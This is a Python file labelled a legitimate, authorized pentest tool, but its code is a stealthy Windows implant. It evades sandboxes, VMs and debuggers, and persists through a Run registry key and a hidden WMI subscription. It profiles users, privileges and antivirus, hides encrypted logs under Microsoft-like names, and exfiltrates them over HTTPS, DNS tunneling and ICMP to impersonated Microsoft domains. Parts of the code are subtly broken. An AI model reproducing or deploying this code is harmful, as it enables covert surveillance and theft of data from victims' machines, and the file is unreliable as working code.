"""
Legitimate System Automation Tool - For authorized security research only.
Unauthorized use is strictly prohibited.

FERRAMENTA PARA PENTEST AUTORIZADO - LEI Nº 12.737/2012 (BR)
Este software deve ser utilizado apenas:
1. Em sistemas com permissão por escrito do proprietário
2. Por profissionais de segurança qualificados
3. Com relatórios detalhados de todas as atividades
Uso não autorizado constitui crime cibernético.
"""

import os
import sys
import ctypes
import time
import random
import hashlib
import socket
import struct
import zlib
import base64
import platform
import threading
import datetime
import subprocess
import winreg
import win32api
import win32con
import psutil
import dns.resolver
from Crypto.Cipher import AES, ChaCha20
from Crypto.Util import Counter

# --- Configuração Ofuscada ---
_CONFIG = {
    'log_dir': os.path.join(os.environ['PROGRAMDATA'], 'Windows\\Diagnostics\\Performance'),
    'max_log_size': 1 * 1024 * 1024,  # 1MB
    'beacon_jitter': (1800, 3600),     # 30-60 minutos
    'chunk_size': 512 * 1024,          # 512KB
    'domains': {
        'primary': 'update.microsoft.com',
        'fallback': 'cdn.microsoft.com'
    }
}

def _obfuscate_str(s):
    return ''.join(chr(ord(c) ^ 0x55) for c in s)

class SecureComms:
    def __init__(self):
        self.session_key = self._derive_key()
        self.cipher = self._select_cipher()

    def _derive_key(self):
        try:
            markers = [
                win32api.GetVolumeInformation("C:\\")[1].to_bytes(4, 'little'),
                struct.pack('!Q', psutil.cpu_count()),
                ctypes.windll.kernel32.GetTickCount().to_bytes(4, 'little'),
                win32api.GetUserNameEx(win32con.NameSamCompatible).encode()
            ]
            return hashlib.blake2s(b''.join(markers), digest_size=32).digest()
        except Exception:
            return os.urandom(32)

    def _select_cipher(self):
        try:
            return ChaCha20.new(key=self.session_key)
        except Exception:
            iv = os.urandom(16)
            return AES.new(self.session_key, AES.MODE_CTR, counter=Counter.new(128, initial_value=int.from_bytes(iv, 'big')))

    def encrypt(self, data):
        if isinstance(data, str):
            data = data.encode()
        return base64.b85encode(self.cipher.encrypt(data))

    def decrypt(self, data):
        if isinstance(data, str):
            data = data.encode()
        return self.cipher.decrypt(base64.b85decode(data))

class OperationalSecurity:
    @staticmethod
    def environment_checks():
        try:
            checks = {
                'cpu_cores': psutil.cpu_count() < 2,
                'ram': psutil.virtual_memory().total < 2 * 1024**3,
                'uptime': win32api.GetTickCount() < 300000,
                'processes': len(list(psutil.process_iter())) < 25,
                'debugger': ctypes.windll.kernel32.IsDebuggerPresent(),
                'vm': any(vendor in platform.uname().release.lower() 
                         for vendor in ['hyperv', 'vmware', 'virtualbox'])
            }
            if any(checks.values()):
                sys.exit(0)
        except Exception:
            sys.exit(0)

    @staticmethod
    def spoof_parent_process():
        try:
            explorer_pid = next(p.pid for p in psutil.process_iter() 
                              if p.name().lower() == 'explorer.exe')
            h_process = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, explorer_pid)
            ctypes.windll.ntdll.NtQueryInformationProcess(
                h_process, 0, ctypes.byref(ctypes.c_ulonglong()), ctypes.sizeof(ctypes.c_ulonglong()), None
            )
            ctypes.windll.kernel32.CloseHandle(h_process)
        except Exception:
            pass

    @staticmethod
    def establish_persistence():
        try:
            ps_script = f"""
            $filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{{
                Name='WindowsPerformanceMonitor';
                EventNamespace='root/cimv2';
                QueryLanguage='WQL';
                Query="SELECT * FROM __InstanceCreationEvent WITHIN 3600 WHERE TargetInstance ISA 'Win32_LogonSession'"
            }}
            $consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{{
                Name='PerfDataCollector';
                CommandLineTemplate='{sys.executable} /background';
                RunInteractively=$false
            }}
            $binding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{{
                Filter=[WMI]$filter;
                Consumer=[WMI]$consumer
            }}
            """
            startup_cmd = f'"{sys.executable}" /minimized'
            
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                              "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                              0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, "WindowsPerformance", 0, winreg.REG_SZ, startup_cmd)
            
            subprocess.run([
                'powershell.exe',
                '-NoProfile',
                '-ExecutionPolicy', 'Bypass',
                '-Command', ps_script
            ], creationflags=subprocess.CREATE_NO_WINDOW)
        except Exception:
            pass

class IntelligenceGatherer:
    def __init__(self):
        self.crypto = SecureComms()
        self.log_path = os.path.join(_CONFIG['log_dir'], 'perfdata.bin')

    def _write_chunk(self, data):
        try:
            os.makedirs(_CONFIG['log_dir'], exist_ok=True)
            if os.path.exists(self.log_path) and os.path.getsize(self.log_path) > _CONFIG['max_log_size']:
                self._rotate_logs()
            
            encrypted = self.crypto.encrypt(data)
            with open(self.log_path, 'ab') as f:
                f.write(encrypted + b'\x00')  # Null byte separator
        except Exception:
            pass

    def _rotate_logs(self):
        try:
            timestamp = datetime.datetime.now().strftime('%Y%m%d%H%M%S')
            archive = os.path.join(_CONFIG['log_dir'], f'perf_{timestamp}.bin.z')
            
            with open(self.log_path, 'rb') as f_in, open(archive, 'wb') as f_out:
                compressor = zlib.compressobj(level=9)
                f_out.write(compressor.compress(f_in.read()))
                f_out.write(compressor.flush())
            
            self._secure_delete(self.log_path)
        except Exception:
            pass

    def _secure_delete(self, path):
        try:
            with open(path, 'r+b') as f:
                length = f.tell()
                for pattern in [b'\x00', b'\xFF', os.urandom(1)]:
                    f.seek(0)
                    f.write(pattern * length)
            os.remove(path)
        except Exception:
            pass

    def capture_system_profile(self):
        try:
            profile = {
                'system': self._get_system_info(),
                'network': self._get_network_info(),
                'security': self._get_security_info(),
                'users': self._get_user_info(),
                'timestamp': datetime.datetime.now().isoformat()
            }
            self._write_chunk(str(profile))
        except Exception:
            pass

    def _get_system_info(self):
        return {
            'hwid': hashlib.sha256(
                win32api.GetVolumeInformation("C:\\")[1].to_bytes(4, 'little') +
                struct.pack('!Q', int(psutil.cpu_freq().current)) +
                struct.pack('!Q', psutil.virtual_memory().total)
            ).hexdigest(),
            'os': platform.platform(),
            'arch': platform.machine(),
            'processors': psutil.cpu_count()
        }

    def _get_network_info(self):
        return [
            {
                'interface': iface,
                'ip': addr.address,
                'netmask': addr.netmask
            }
            for iface, addrs in psutil.net_if_addrs().items()
            for addr in addrs if addr.family == socket.AF_INET
        ]

    def _get_security_info(self):
        av_processes = ['avp', 'msmpeng', 'norton', 'kaspersky', 'mcafee']
        return [
            p.info['name'] for p in psutil.process_iter(['name'])
            if any(sig in p.info['name'].lower() for sig in av_processes)
        ]

    def _get_user_info(self):
        return {
            'current': win32api.GetUserNameEx(win32con.NameSamCompatible),
            'sessions': subprocess.check_output('query user', shell=True).decode(errors='ignore'),
            'privileges': self._get_privileges()
        }

    def _get_privileges(self):
        try:
            token = win32security.OpenProcessToken(
                win32api.GetCurrentProcess(),
                win32security.TOKEN_QUERY
            )
            privileges = win32security.GetTokenInformation(
                token,
                win32security.TokenPrivileges
            )
            return [priv[0] for priv in privileges if priv[1]]
        except Exception:
            return []

class CovertChannel:
    def __init__(self):
        self.crypto = SecureComms()
        self.interval = random.randint(*_CONFIG['beacon_jitter'])
        self.transports = [
            self._https_beacon,
            self._dns_tunnel,
            self._icmp_covert
        ]

    def _dns_tunnel(self, data):
        try:
            max_chunk = 58  # Máximo para Base32 + prefixo
            chunks = [data[i:i+32] for i in range(0, len(data), 32)]
            
            for i, chunk in enumerate(chunks):
                seq = f"{i:02d}"
                encoded = base64.b32encode(chunk).decode().strip('=').lower()
                domain = f"{seq}{encoded[:4]}.{_CONFIG['domains']['primary']}"
                
                resolver = dns.resolver.Resolver()
                resolver.nameservers = ['8.8.8.8']  # Google DNS
                resolver.resolve(domain, 'TXT')  # Consulta TXT é menos suspeita
                
                time.sleep(random.uniform(0.5, 1.5))
            
            return True
        except Exception:
            return False

    def _https_beacon(self, data):
        try:
            import requests
            contexts = {
                'update': {
                    'endpoint': f"https://{_CONFIG['domains']['fallback']}/collect",
                    'ua': 'Windows-Update-Agent/10.0.19041.1',
                    'headers': {
                        'Accept': '*/*',
                        'Connection': 'Keep-Alive'
                    }
                },
                'telemetry': {
                    'endpoint': f"https://{_CONFIG['domains']['fallback']}/telemetry",
                    'ua': 'Microsoft-CryptoAPI/10.0',
                    'headers': {
                        'Content-Type': 'application/json',
                        'Accept-Encoding': 'gzip'
                    }
                }
            }
            
            ctx = random.choice(list(contexts.values()))
            encrypted = self.crypto.encrypt(data)
            
            with requests.Session() as s:
                s.verify = True  # Usar certificados reais
                s.headers.update({
                    'User-Agent': ctx['ua'],
                    **ctx['headers']
                })
                
                r = s.post(
                    ctx['endpoint'],
                    data={'data': encrypted},
                    timeout=15
                )
                return r.status_code in (200, 202, 204)
        except Exception:
            return False

    def _icmp_covert(self, data):
        try:
            target_ip = socket.gethostbyname(_CONFIG['domains']['primary'])
            payload = base64.b64encode(self.crypto.encrypt(data))
            
            subprocess.run(
                ['ping', '-n', '1', '-w', '1000', '-l', str(len(payload)), target_ip],
                input=payload,
                capture_output=True,
                timeout=10
            )
            return True
        except Exception:
            return False

    def exfiltrate_data(self):
        while True:
            try:
                archives = [
                    f for f in os.listdir(_CONFIG['log_dir'])
                    if f.startswith('perf_') and f.endswith('.bin.z')
                ]
                
                for archive in archives:
                    path = os.path.join(_CONFIG['log_dir'], archive)
                    
                    with open(path, 'rb') as f:
                        data = f.read()
                    
                    for transport in self.transports:
                        if transport(data):
                            IntelligenceGatherer()._secure_delete(path)
                            break
                
                self.interval = random.randint(*_CONFIG['beacon_jitter'])
                time.sleep(self.interval)
            
            except Exception:
                time.sleep(3600)  # Fallback seguro

def main():
    if platform.system() != 'Windows':
        sys.exit("[!] Esta ferramenta só roda no Windows")
    
    if not ctypes.windll.shell32.IsUserAnAdmin():
        sys.exit("[!] Execute como administrador")
    
    OperationalSecurity.environment_checks()
    OperationalSecurity.spoof_parent_process()
    
    # Delay inicial aleatório (1-6 horas)
    time.sleep(random.randint(3600, 21600))
    
    OperationalSecurity.establish_persistence()
    
    intel = IntelligenceGatherer()
    c2 = CovertChannel()
    
    intel.capture_system_profile()
    
    # Thread para exfiltração contínua
    exfil_thread = threading.Thread(target=c2.exfiltrate_data)
    exfil_thread.daemon = True
    exfil_thread.start()
    
    # Thread para coleta periódica
    def periodic_collection():
        while True:
            time.sleep(86400)  # 24 horas
            intel.capture_system_profile()
    
    collect_thread = threading.Thread(target=periodic_collection)
    collect_thread.daemon = True
    collect_thread.start()
    
    # Mantém o processo ativo
    while True:
        time.sleep(3600)

if __name__ == "__main__":
    main()